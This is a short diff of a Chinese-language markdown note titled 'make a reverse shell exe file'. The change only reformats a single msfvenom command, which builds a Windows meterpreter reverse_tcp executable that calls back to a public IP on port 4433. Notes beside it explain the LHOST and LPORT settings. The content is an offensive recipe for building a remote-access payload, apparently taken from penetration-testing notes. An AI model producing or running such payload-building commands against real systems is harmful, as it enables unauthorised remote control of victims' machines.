@@ -4,9 +4,10 @@
 # 1 .制作反弹shell-exe文件
 
 执行命令
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=2x.94.50.153 LPORT=4433 -f exe -o 4433.exe
 
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=2x.94.50.153 LPORT=4433 -f exe -o 4433.exe`
-
+```
 > `LHOST`为公网IP
 
 > `LPORT`为反弹端口
